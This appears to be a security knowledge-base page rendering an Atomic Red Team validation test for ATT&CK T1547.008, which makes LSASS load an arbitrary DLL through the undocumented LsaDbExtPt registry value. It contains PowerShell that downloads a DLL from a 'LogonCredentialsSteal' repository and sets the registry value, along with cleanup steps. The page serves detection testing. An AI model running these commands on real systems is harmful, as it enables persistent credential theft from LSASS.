---
atomic_guid: "8ecef16d-d289-46b4-917b-0dba6dc81cf1"
title: "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.008"
attack_technique_name: "Boot or Logon Autostart Execution: LSASS Driver"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.008/T1547.008.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "8ecef16d-d289-46b4-917b-0dba6dc81cf1"
  - "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt

The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. 

Upon execution, the registry key will be modified and a value will contain the path to the DLL. 
Reference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal
Note that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.

## Metadata

- Atomic GUID: 8ecef16d-d289-46b4-917b-0dba6dc81cf1
- Technique: T1547.008: Boot or Logon Autostart Execution: LSASS Driver
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1547.008/T1547.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.008]]

## Input Arguments

### dll_path

- description: Module to be loaded into LSASS
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\lsass_lib.dll

## Dependencies

lsass_lib.dll must exist on disk at specified location (#{dll_path})

### Prerequisite Check

```powershell
if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll" -UseBasicParsing -OutFile "#{dll_path}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "#{dll_path}"
```

### Cleanup

```powershell
Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS" -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.008/T1547.008.yaml)
